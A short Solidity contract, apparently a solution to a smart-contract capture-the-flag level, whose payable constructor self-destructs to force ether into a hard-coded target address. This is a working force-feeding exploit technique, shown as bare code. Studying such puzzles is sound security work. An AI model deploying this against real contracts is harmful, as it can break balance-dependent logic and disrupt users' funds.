

contract Forced {

    constructor() payable {
        address force = 0x69F6ab21aBD9887D93EF55AA5B89686E448c923C;
        selfdestruct(payable(force));
    }
}